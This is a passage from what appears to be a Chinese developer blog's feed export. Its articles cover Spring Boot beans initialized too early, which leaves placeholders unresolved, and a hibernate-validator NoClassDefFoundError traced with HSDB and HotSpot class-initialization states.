<li><code>MyDataSourceConfig</code>里的<code>dataSource1</code>被提前初始化，没有经过<code>PropertySourcesPlaceholderConfigurer</code>的处理，所以<code>@Value(&quot;${db.user}&quot;) String user</code> 里的占位符没有被处理</li>
</ul>
<p>要解决这个问题，可以在代码里，显式来处理占位符：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">environment.resolvePlaceholders(<span class="string">"$&#123;db.user&#125;"</span>)</span><br></pre></td></tr></table></figure>
<h2 id="例子2：Spring-boot自身实现问题，导致Bean被提前初始化"><a href="#例子2：Spring-boot自身实现问题，导致Bean被提前初始化" class="headerlink" title="例子2：Spring boot自身实现问题，导致Bean被提前初始化"></a>例子2：Spring boot自身实现问题，导致Bean被提前初始化</h2><p>例子代码：<a href="https://github.com/hengyunabc/spring-boot-inside/tree/master/demo-ConditionalOnBean-placeholder" target="_blank" rel="noopener">https://github.com/hengyunabc/spring-boot-inside/tree/master/demo-ConditionalOnBean-placeholder</a></p>
<p>Spring Boot里提供了<code>@ConditionalOnBean</code>，这个方便用户在不同条件下来创建bean。里面提供了判断是否存在bean上有某个注解的功能。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Target</span>(&#123; ElementType.TYPE, ElementType.METHOD &#125;)</span><br><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)</span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Conditional</span>(OnBeanCondition<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class"><span class="title">public</span> @<span class="title">interface</span> <span class="title">ConditionalOnBean</span> </span>&#123;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * The annotation type decorating a bean that should be checked. The condition matches</span></span><br><span class="line"><span class="comment">	 * when any of the annotations specified is defined on a bean in the</span></span><br><span class="line"><span class="comment">	 * &#123;<span class="doctag">@link</span> ApplicationContext&#125;.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> the class-level annotation types to check</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	Class&lt;? extends Annotation&gt;[] annotation() <span class="keyword">default</span> &#123;&#125;;</span><br></pre></td></tr></table></figure>
<p>比如用户自己定义了一个Annotation：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Target</span>(&#123; ElementType.TYPE &#125;)</span><br><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> MyAnnotation &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后用下面的写法来创建abc这个bean，意思是当用户显式使用了<code>@MyAnnotation</code>（比如放在main class上），才会创建这个bean。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyAutoConfiguration</span> </span>&#123;</span><br><span class="line">	<span class="meta">@Bean</span></span><br><span class="line">	<span class="comment">// if comment this line, it will be fine.</span></span><br><span class="line">	<span class="meta">@ConditionalOnBean</span>(annotation = &#123; MyAnnotation<span class="class">.<span class="keyword">class</span> &#125;)</span></span><br><span class="line"><span class="class">	<span class="title">public</span> <span class="title">String</span> <span class="title">abc</span>() </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"abc"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个功能很好，但是在spring boot 1.4.5 版本之前都有问题，会导致FactoryBean提前初始化。</p>
<p>在例子里，通过xml创建了<code>javaVersion</code>这个bean，想获取到java的版本号。这里使用的是spring提供的一个调用static函数创建bean的技巧。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"sysProps"</span> <span class="attr">class</span>=<span class="string">"org.springframework.beans.factory.config.MethodInvokingFactoryBean"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"targetClass"</span> <span class="attr">value</span>=<span class="string">"java.lang.System"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"targetMethod"</span> <span class="attr">value</span>=<span class="string">"getProperties"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"javaVersion"</span> <span class="attr">class</span>=<span class="string">"org.springframework.beans.factory.config.MethodInvokingFactoryBean"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"targetObject"</span> <span class="attr">ref</span>=<span class="string">"sysProps"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"targetMethod"</span> <span class="attr">value</span>=<span class="string">"getProperty"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"arguments"</span> <span class="attr">value</span>=<span class="string">"$&#123;java.version.key&#125;"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们在代码里获取到这个<code>javaVersion</code>，然后打印出来：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@ImportResource</span>(<span class="string">"classpath:/demo.xml"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DemoApplication</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		ConfigurableApplicationContext context = SpringApplication.run(DemoApplication<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">		System.err.println(context.getBean(<span class="string">"javaVersion"</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在实际运行时，发现javaVersion的值是null。</p>
<p>这个其实是spring boot的锅，要搞清楚这个问题，先要看<code>@ConditionalOnBean</code>的实现。</p>
<ul>
<li><code>@ConditionalOnBean</code>实际上是在ConfigurationClassPostProcessor里被处理的，它实现了<code>BeanDefinitionRegistryPostProcessor</code></li>
<li><code>BeanDefinitionRegistryPostProcessor</code>是在spring早期被处理的</li>
<li><code>@ConditionalOnBean</code>的具体处理代码在<code>org.springframework.boot.autoconfigure.condition.OnBeanCondition</code>里</li>
<li><p><code>OnBeanCondition</code>在获取bean的Annotation时，调用了<code>beanFactory.getBeanNamesForAnnotation</code></p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> String[] getBeanNamesForAnnotation(</span><br><span class="line">    ConfigurableListableBeanFactory beanFactory, String type,</span><br><span class="line">    ClassLoader classLoader, <span class="keyword">boolean</span> considerHierarchy) <span class="keyword">throws</span> LinkageError &#123;</span><br><span class="line">  String[] result = NO_BEANS;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">    Class&lt;? extends Annotation&gt; typeClass = (Class&lt;? extends Annotation&gt;) ClassUtils</span><br><span class="line">        .forName(type, classLoader);</span><br><span class="line">    result = beanFactory.getBeanNamesForAnnotation(typeClass);</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>beanFactory.getBeanNamesForAnnotation</code> 会导致<code>FactoryBean</code>提前初始化，创建出<code>javaVersion</code>里，传入的<code>${java.version.key}</code>没有被处理，值为null。</p>
</li>
<li><p>spring boot 1.4.5 修复了这个问题：<a href="https://github.com/spring-projects/spring-boot/issues/8269" target="_blank" rel="noopener">https://github.com/spring-projects/spring-boot/issues/8269</a></p>
</li>
</ul>
<h2 id="实现spring-boot-starter要注意不能导致bean提前初始化"><a href="#实现spring-boot-starter要注意不能导致bean提前初始化" class="headerlink" title="实现spring boot starter要注意不能导致bean提前初始化"></a>实现spring boot starter要注意不能导致bean提前初始化</h2><p>用户在实现spring boot starter时，通常会实现Spring的一些接口，比如<code>BeanFactoryPostProcessor</code>接口，在处理时，要注意不能调用类似<code>beanFactory.getBeansOfType</code>，<code>beanFactory.getBeanNamesForAnnotation</code> 这些函数，因为会导致一些bean提前初始化。</p>
<p>而上面有提到<code>PropertySourcesPlaceholderConfigurer</code>的order是最低优先级的，所以用户自己实现的<code>BeanFactoryPostProcessor</code>接口在被回调时很有可能占位符还没有被处理。</p>
<p>对于用户自己定义的<code>@ConfigurationProperties</code>对象的注入，可以用类似下面的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ConfigurationProperties</span>(prefix = <span class="string">"spring.my"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyProperties</span> </span>&#123;</span><br><span class="line">	String key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> MyProperties <span class="title">buildMyProperties</span><span class="params">(ConfigurableEnvironment environment)</span> </span>&#123;</span><br><span class="line">  MyProperties myProperties = <span class="keyword">new</span> MyProperties();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (environment != <span class="keyword">null</span>) &#123;</span><br><span class="line">    MutablePropertySources propertySources = environment.getPropertySources();</span><br><span class="line">    <span class="keyword">new</span> RelaxedDataBinder(myProperties, <span class="string">"spring.my"</span>).bind(<span class="keyword">new</span> PropertySourcesPropertyValues(propertySources));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> myProperties;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>占位符（${}表达式）是在<code>PropertySourcesPlaceholderConfigurer</code>里处理的，也就是<code>BeanFactoryPostProcessor</code>接口</li>
<li>spring的生命周期是比较复杂的事情，在实现了一些早期的接口时要小心，不能导致spring bean提前初始化</li>
<li>在早期的接口实现里，如果想要处理占位符，可以利用spring自身的api，比如 <code>environment.resolvePlaceholders(&quot;${db.user}&quot;)</code></li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>spring-boot</tag>
        <tag>spring</tag>
        <tag>springmvc</tag>
        <tag>mvc</tag>
      </tags>
  </entry>
  <entry>
    <title>深入JVM分析spring-boot应用hibernate-validator NoClassDefFoundError</title>
    <url>/hibernate-validar-noclassdefounderror/</url>
    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ul>
<li>可重现的Demo代码：<a href="https://github.com/hengyunabc/spring-boot-inside/tree/master/demo-hibernate-validator-NoClassDefFoundError" target="_blank" rel="noopener">https://github.com/hengyunabc/spring-boot-inside/tree/master/demo-hibernate-validator-NoClassDefFoundError</a></li>
</ul>
<p>最近排查一个spring boot应用抛出hibernate.validator NoClassDefFoundError的问题，异常信息如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Caused by: java.lang.NoClassDefFoundError: Could not initialize class org.hibernate.validator.internal.engine.ConfigurationImpl</span><br><span class="line">	at org.hibernate.validator.HibernateValidator.createGenericConfiguration(HibernateValidator.java:33) ~[hibernate-validator-5.3.5.Final.jar:5.3.5.Final]</span><br><span class="line">	at javax.validation.Validation$GenericBootstrapImpl.configure(Validation.java:276) ~[validation-api-1.1.0.Final.jar:na]</span><br><span class="line">	at org.springframework.boot.validation.MessageInterpolatorFactory.getObject(MessageInterpolatorFactory.java:53) ~[spring-boot-1.5.3.RELEASE.jar:1.5.3.RELEASE]</span><br><span class="line">	at org.springframework.boot.autoconfigure.validation.DefaultValidatorConfiguration.defaultValidator(DefaultValidatorConfiguration.java:43) ~[spring-boot-autoconfigure-1.5.3.RELEASE.jar:1.5.3.RELEASE]</span><br><span class="line">	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_112]</span><br><span class="line">	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_112]</span><br><span class="line">	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_112]</span><br><span class="line">	at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_112]</span><br><span class="line">	at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:162) ~[spring-beans-4.3.8.RELEASE.jar:4.3.8.RELEASE]</span><br><span class="line">	... 32 common frames omitted</span><br></pre></td></tr></table></figure>
<p>这个错误信息表面上是<code>NoClassDefFoundError</code>，但是实际上<code>ConfigurationImpl</code>这个类是在<code>hibernate-validator-5.3.5.Final.jar</code>里的，不应该出现找不到类的情况。</p>
<p>那为什么应用里抛出这个<code>NoClassDefFoundError</code> ？</p>
<p>有经验的开发人员从<code>Could not initialize class</code> 这个信息就可以知道，实际上是一个类在初始化时抛出的异常，比如static的静态代码块，或者static字段初始化的异常。</p>
<h2 id="谁初始化了-org-hibernate-validator-internal-engine-ConfigurationImpl"><a href="#谁初始化了-org-hibernate-validator-internal-engine-ConfigurationImpl" class="headerlink" title="谁初始化了 org.hibernate.validator.internal.engine.ConfigurationImpl"></a>谁初始化了 org.hibernate.validator.internal.engine.ConfigurationImpl</h2><p>但是当我们在<code>HibernateValidator</code> 这个类，创建<code>ConfigurationImpl</code>的代码块里打断点时，发现有两个线程触发了断点：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HibernateValidator</span> <span class="keyword">implements</span> <span class="title">ValidationProvider</span>&lt;<span class="title">HibernateValidatorConfiguration</span>&gt; </span>&#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> Configuration&lt;?&gt; createGenericConfiguration(BootstrapState state) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> ConfigurationImpl( state );</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>其中一个线程的调用栈是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread [background-preinit] (Class load: ConfigurationImpl)</span><br><span class="line">	HibernateValidator.createGenericConfiguration(BootstrapState) line: <span class="number">33</span></span><br><span class="line">	Validation$GenericBootstrapImpl.configure() line: <span class="number">276</span></span><br><span class="line">	BackgroundPreinitializer$ValidationInitializer.run() line: <span class="number">107</span></span><br><span class="line">	BackgroundPreinitializer$<span class="number">1</span>.runSafely(Runnable) line: <span class="number">59</span></span><br><span class="line">	BackgroundPreinitializer$<span class="number">1</span>.run() line: <span class="number">52</span></span><br><span class="line">	Thread.run() line: <span class="number">745</span></span><br></pre></td></tr></table></figure>
<p>另外一个线程调用栈是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread [main] (Suspended (breakpoint at line <span class="number">33</span> in HibernateValidator))</span><br><span class="line">	owns: ConcurrentHashMap&lt;K,V&gt;  (id=<span class="number">52</span>)</span><br><span class="line">	owns: Object  (id=<span class="number">53</span>)</span><br><span class="line">	HibernateValidator.createGenericConfiguration(BootstrapState) line: <span class="number">33</span></span><br><span class="line">	Validation$GenericBootstrapImpl.configure() line: <span class="number">276</span></span><br><span class="line">	MessageInterpolatorFactory.getObject() line: <span class="number">53</span></span><br><span class="line">	DefaultValidatorConfiguration.defaultValidator() line: <span class="number">43</span></span><br><span class="line">	NativeMethodAccessorImpl.invoke0(Method, Object, Object[]) line: not available [<span class="keyword">native</span> method]</span><br><span class="line">	NativeMethodAccessorImpl.invoke(Object, Object[]) line: <span class="number">62</span></span><br><span class="line">	DelegatingMethodAccessorImpl.invoke(Object, Object[]) line: <span class="number">43</span></span><br><span class="line">	Method.invoke(Object, Object...) line: <span class="number">498</span></span><br><span class="line">	CglibSubclassingInstantiationStrategy(SimpleInstantiationStrategy).instantiate(RootBeanDefinition, String, BeanFactory, Object, Method, Object...) line: <span class="number">162</span></span><br><span class="line">	ConstructorResolver.instantiateUsingFactoryMethod(String, RootBeanDefinition, Object[]) line: <span class="number">588</span></span><br><span class="line">	DefaultListableBeanFactory(AbstractAutowireCapableBeanFactory).instantiateUsingFactoryMethod(String, RootBeanDefinition, Object[]) line: <span class="number">1173</span></span><br></pre></td></tr></table></figure>
<p>显然，这个线程的调用栈是常见的spring的初始化过程。</p>
<h3 id="BackgroundPreinitializer-做了什么"><a href="#BackgroundPreinitializer-做了什么" class="headerlink" title="BackgroundPreinitializer 做了什么"></a>BackgroundPreinitializer 做了什么</h3><p>那么重点来看下 <code>BackgroundPreinitializer</code> 线程做了哪些事情：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Order</span>(LoggingApplicationListener.DEFAULT_ORDER + <span class="number">1</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BackgroundPreinitializer</span></span></span><br><span class="line"><span class="class">		<span class="keyword">implements</span> <span class="title">ApplicationListener</span>&lt;<span class="title">ApplicationEnvironmentPreparedEvent</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onApplicationEvent</span><span class="params">(ApplicationEnvironmentPreparedEvent event)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			Thread thread = <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line"></span><br><span class="line">				<span class="meta">@Override</span></span><br><span class="line">				<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">					runSafely(<span class="keyword">new</span> MessageConverterInitializer());</span><br><span class="line">					runSafely(<span class="keyword">new</span> MBeanFactoryInitializer());</span><br><span class="line">					runSafely(<span class="keyword">new</span> ValidationInitializer());</span><br><span class="line">					runSafely(<span class="keyword">new</span> JacksonInitializer());</span><br><span class="line">					runSafely(<span class="keyword">new</span> ConversionServiceInitializer());</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">runSafely</span><span class="params">(Runnable runnable)</span> </span>&#123;</span><br><span class="line">					<span class="keyword">try</span> &#123;</span><br><span class="line">						runnable.run();</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">						<span class="comment">// Ignore</span></span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125;, <span class="string">"background-preinit"</span>);</span><br><span class="line">			thread.start();</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到<code>BackgroundPreinitializer</code>类是spring boot为了加速应用的初始化，以一个独立的线程来加载hibernate validator这些组件。</p>
<p>这个 <code>background-preinit</code> 线程会吞掉所有的异常。</p>
<p>显然<code>ConfigurationImpl</code> 初始化的异常也被吞掉了，那么如何才能获取到最原始的信息？</p>
<h3 id="获取到最原始的异常信息"><a href="#获取到最原始的异常信息" class="headerlink" title="获取到最原始的异常信息"></a>获取到最原始的异常信息</h3><p>在<code>BackgroundPreinitializer</code>的 <code>run()</code> 函数里打一个断点（注意是<code>Suspend thread</code>类型, 不是<code>Suspend VM</code>），让它先不要触发<code>ConfigurationImpl</code>的加载，让spring boot的正常流程去触发<code>ConfigurationImpl</code>的加载，就可以知道具体的信息了。</p>
<p>那么打出来的异常信息是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Caused by: java.lang.NoSuchMethodError: org.jboss.logging.Logger.getMessageLogger(Ljava/lang/Class;Ljava/lang/String;)Ljava/lang/Object;</span><br><span class="line">	at org.hibernate.validator.internal.util.logging.LoggerFactory.make(LoggerFactory.java:<span class="number">19</span>) ~[hibernate-validator-<span class="number">5.3</span><span class="number">.5</span>.Final.jar:<span class="number">5.3</span><span class="number">.5</span>.Final]</span><br><span class="line">	at org.hibernate.validator.internal.util.Version.&lt;clinit&gt;(Version.java:<span class="number">22</span>) ~[hibernate-validator-<span class="number">5.3</span><span class="number">.5</span>.Final.jar:<span class="number">5.3</span><span class="number">.5</span>.Final]</span><br><span class="line">	at org.hibernate.validator.internal.engine.ConfigurationImpl.&lt;clinit&gt;(ConfigurationImpl.java:<span class="number">71</span>) ~[hibernate-validator-<span class="number">5.3</span><span class="number">.5</span>.Final.jar:<span class="number">5.3</span><span class="number">.5</span>.Final]</span><br><span class="line">	at org.hibernate.validator.HibernateValidator.createGenericConfiguration(HibernateValidator.java:<span class="number">33</span>) ~[hibernate-validator-<span class="number">5.3</span><span class="number">.5</span>.Final.jar:<span class="number">5.3</span><span class="number">.5</span>.Final]</span><br><span class="line">	at javax.validation.Validation$GenericBootstrapImpl.configure(Validation.java:<span class="number">276</span>) ~[validation-api-<span class="number">1.1</span><span class="number">.0</span>.Final.jar:na]</span><br><span class="line">	at org.springframework.boot.validation.MessageInterpolatorFactory.getObject(MessageInterpolatorFactory.java:<span class="number">53</span>) ~[spring-boot-<span class="number">1.5</span><span class="number">.3</span>.RELEASE.jar:<span class="number">1.5</span><span class="number">.3</span>.RELEASE]</span><br></pre></td></tr></table></figure>
<p>那么可以看出是 <code>org.jboss.logging.Logger</code> 这个类不兼容，少了<code>getMessageLogger(Ljava/lang/Class;Ljava/lang/String;)Ljava/lang/Object</code> 这个函数。</p>
<p>那么检查下应用的依赖，可以发现<code>org.jboss.logging.Logger</code> 在<code>jboss-common-1.2.1.GA.jar</code>和<code>jboss-logging-3.3.1.Final.jar</code>里都有。</p>
<p>显然是<code>jboss-common-1.2.1.GA.jar</code> 这个依赖过时了，需要排除掉。</p>
<h3 id="总结异常的发生流程"><a href="#总结异常的发生流程" class="headerlink" title="总结异常的发生流程"></a>总结异常的发生流程</h3><ol start="0">
<li>应用依赖了<code>jboss-common-1.2.1.GA.jar</code>，它里面的<code>org.jboss.logging.Logger</code>太老</li>
<li>spring boot启动时，<code>BackgroundPreinitializer</code>里的线程去尝试加载<code>ConfigurationImpl</code>，然后触发了<code>org.jboss.logging.Logger</code>的函数执行问题</li>
<li><code>BackgroundPreinitializer</code> 吃掉了异常信息，jvm把<code>ConfigurationImpl</code>标记为不可用的</li>
<li><p>spring boot正常的流程去加载<code>ConfigurationImpl</code>，jvm发现<code>ConfigurationImpl</code>类是不可用，直接抛出<code>NoClassDefFoundError</code></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Caused by: java.lang.NoClassDefFoundError: Could not initialize class org.hibernate.validator.internal.engine.ConfigurationImpl</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="深入JVM"><a href="#深入JVM" class="headerlink" title="深入JVM"></a>深入JVM</h2><p>为什么第二次尝试加载<code>ConfigurationImpl</code>时，会直接抛出<code>java.lang.NoClassDefFoundError: Could not initialize class</code> ？</p>
<p>下面用一段简单的代码来重现这个问题：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  org.hibernate.validator.internal.util.Version.touch();</span><br><span class="line">&#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">  e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">System.in.read();</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  org.hibernate.validator.internal.util.Version.touch();</span><br><span class="line">&#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">  e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="使用HSDB来确定类的状态"><a href="#使用HSDB来确定类的状态" class="headerlink" title="使用HSDB来确定类的状态"></a>使用HSDB来确定类的状态</h3><p>当抛出第一个异常时，尝试用HSDB来看下这个类的状态。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo java -classpath &quot;$JAVA_HOME/lib/sa-jdi.jar&quot; sun.jvm.hotspot.HSDB</span><br></pre></td></tr></table></figure>
<p>然后在HSDB console里查找到<code>Version</code>的地址信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hsdb&gt; class org.hibernate.validator.internal.util.Version</span><br><span class="line">org/hibernate/validator/internal/util/Version @0x00000007c0060218</span><br></pre></td></tr></table></figure>
<p>然后在<code>Inspector</code>查找到这个地址，发现<code>_init_state</code>是5。</p>
<p><img src="/img/hsfdb-version-class.png" alt="hsfdb-version-class.png"></p>
<p>再看下hotspot代码，可以发现5对应的定义是<code>initialization_error</code>：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// /hotspot/src/share/vm/oops/instanceKlass.hpp</span></span><br><span class="line"><span class="comment">// See "The Java Virtual Machine Specification" section 2.16.2-5 for a detailed description</span></span><br><span class="line"><span class="comment">// of the class loading &amp; initialization procedure, and the use of the states.</span></span><br><span class="line"><span class="keyword">enum</span> ClassState &#123;</span><br><span class="line">  allocated,                          <span class="comment">// allocated (but not yet linked)</span></span><br><span class="line">  loaded,                             <span class="comment">// loaded and inserted in class hierarchy (but not linked yet)</span></span><br><span class="line">  linked,                             <span class="comment">// successfully linked/verified (but not initialized yet)</span></span><br><span class="line">  being_initialized,                  <span class="comment">// currently running class initializer</span></span><br><span class="line">  fully_initialized,                  <span class="comment">// initialized (successfull final state)</span></span><br><span class="line">  initialization_error                <span class="comment">// error happened during initialization</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="JVM规范里关于Initialization的内容"><a href="#JVM规范里关于Initialization的内容" class="headerlink" title="JVM规范里关于Initialization的内容"></a>JVM规范里关于Initialization的内容</h3><p><a href="http://docs.oracle.com/javase/specs/jvms/se7/html/jvms-5.html#jvms-5.5" target="_blank" rel="noopener">http://docs.oracle.com/javase/specs/jvms/se7/html/jvms-5.html#jvms-5.5</a></p>
<p>从规范里可以看到初始一个类/接口有12步，比较重要的两步都用黑体标记出来了：</p>
<ul>
<li><p>5: If the Class object for C is in an erroneous state, then initialization is not possible. Release LC and throw a NoClassDefFoundError.</p>
</li>
<li><p>11: Otherwise, the class or interface initialization method must have completed abruptly by throwing some exception E. If the class of E is not Error or one of its subclasses, then create a new instance of the class ExceptionInInitializerError with E as the argument, and use this object in place of E in the following step.</p>
</li>
</ul>
<h3 id="第一次尝试加载Version类时"><a href="#第一次尝试加载Version类时" class="headerlink" title="第一次尝试加载Version类时"></a>第一次尝试加载Version类时</h3><p>当第一次尝试加载时，hotspot InterpreterRuntime在解析<code>invokestatic</code>指令时，尝试加载<code>org.hibernate.validator.internal.util.Version</code>类，<code>InstanceKlass</code>的<code>_init_state</code>先是标记为<code>being_initialized</code>，然后当加载失败时，被标记为<code>initialization_error</code>。</p>
<p>对应<code>Initialization</code>的11步。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// hotspot/src/share/vm/oops/instanceKlass.cpp</span></span><br><span class="line"><span class="comment">// Step 10 and 11</span></span><br><span class="line"><span class="function">Handle <span class="title">e</span><span class="params">(THREAD, PENDING_EXCEPTION)</span></span>;</span><br><span class="line">CLEAR_PENDING_EXCEPTION;</span><br><span class="line"><span class="comment">// JVMTI has already reported the pending exception</span></span><br><span class="line"><span class="comment">// JVMTI internal flag reset is needed in order to report ExceptionInInitializerError</span></span><br><span class="line">JvmtiExport::clear_detected_exception((JavaThread*)THREAD);</span><br><span class="line">&#123;</span><br><span class="line">  EXCEPTION_MARK;</span><br><span class="line">  this_oop-&gt;set_initialization_state_and_notify(initialization_error, THREAD);</span><br><span class="line">  CLEAR_PENDING_EXCEPTION;   <span class="comment">// ignore any exception thrown, class initialization error is thrown below</span></span><br><span class="line">  <span class="comment">// JVMTI has already reported the pending exception</span></span><br><span class="line">  <span class="comment">// JVMTI internal flag reset is needed in order to report ExceptionInInitializerError</span></span><br><span class="line">  JvmtiExport::clear_detected_exception((JavaThread*)THREAD);</span><br><span class="line">&#125;</span><br><span class="line">DTRACE_CLASSINIT_PROBE_WAIT(error, InstanceKlass::cast(this_oop()), <span class="number">-1</span>,wait);</span><br><span class="line"><span class="keyword">if</span> (e-&gt;is_a(SystemDictionary::Error_klass())) &#123;</span><br><span class="line">  THROW_OOP(e());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  JavaCallArguments args(e);</span><br><span class="line">  THROW_ARG(vmSymbols::java_lang_ExceptionInInitializerError(),</span><br><span class="line">            vmSymbols::throwable_void_signature(),</span><br><span class="line">            &amp;args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="第二次尝试加载Version类时"><a href="#第二次尝试加载Version类时" class="headerlink" title="第二次尝试加载Version类时"></a>第二次尝试加载Version类时</h3><p>当第二次尝试加载时，检查<code>InstanceKlass</code>的<code>_init_state</code>是<code>initialization_error</code>，则直接抛出<code>NoClassDefFoundError: Could not initialize class</code>.</p>
<p>对应<code>Initialization</code>的5步。</p>
